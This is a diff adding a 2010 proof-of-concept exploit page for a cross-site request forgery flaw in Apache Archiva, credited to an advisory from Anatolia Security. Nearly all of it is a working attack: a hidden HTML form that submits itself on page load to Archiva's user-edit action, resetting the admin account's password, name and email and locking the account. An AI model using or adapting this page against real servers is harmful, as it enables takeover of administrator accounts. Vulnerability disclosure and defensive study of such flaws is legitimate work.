@@ -1,0 +1,36 @@
+ANATOLIA SECURITY (c) 2010 -*-*-
+
+$ Title: Proof of Concept Code for Apache Archiva CSRF
+$ ADV-ID: 2010-001
+$ ADV-URL: http://www.anatoliasecurity.com/adv/as-adv-2010-001.txt
+$ Technical Details: http://www.anatoliasecurity.com
+
+* PoC created by Eliteman 
+~ mail: eliteman [~AT~] anatoliasecurity [~DOT~] com
+~ web: elite.anatoliasecurity.com
+
+--&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; Apache Archiva CSRF PoC &lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;userEditForm&quot; name=&quot;useredit&quot; action=&quot;http://archiva:8080/archiva/security/useredit.action&quot; method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.username&quot; value=&quot;admin&quot; id=&quot;userEditForm_user_username&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.fullName&quot; value=&quot;OWNED0DAY&quot; id=&quot;userEditForm_user_fullName&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.email&quot; value=&quot;0day@zer0day.com&quot; id=&quot;userEditForm_user_email&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.password&quot; value=&quot;1337owned&quot; id=&quot;userEditForm_user_password&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.confirmPassword&quot; value=&quot;1337owned&quot; id=&quot;userEditForm_user_confirmPassword&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.locked&quot; value=&quot;true&quot; id=&quot;userEditForm_user_locked&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;__checkbox_user.locked&quot; value=&quot;true&quot; /&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;user.passwordChangeRequired&quot; value=&quot;true&quot; id=&quot;userEditForm_user_passwordChangeRequired&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;__checkbox_user.passwordChangeRequired&quot; value=&quot;true&quot; /&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin&quot; id=&quot;userEditForm_username&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; id=&quot;userEditForm__submit&quot; name=&quot;method:submit&quot; value=&quot;Update&quot;/&gt;
+&lt;/form&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+  document.forms[0].submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
